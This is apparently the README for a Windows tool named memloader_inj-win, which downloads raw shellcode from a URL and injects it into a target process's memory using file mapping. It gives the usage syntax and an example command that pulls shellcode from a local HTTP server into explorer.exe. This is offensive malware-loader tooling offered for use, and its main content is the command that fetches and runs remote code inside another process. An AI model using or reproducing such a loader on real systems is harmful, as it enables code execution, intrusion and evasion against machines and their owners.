# memloader_inj-win
Inject remote shellcode into process memory using FileMapping

# Usage
``` ./memloader_inj-win.exe [process name] [url] ```

# Example
Raw shellcode is hosted on 127.0.0.1:8000 in a file named shellcode
``` ./memloader_inj-win.exe explorer.exe http://127.0.0.1:8000/shellcode ```
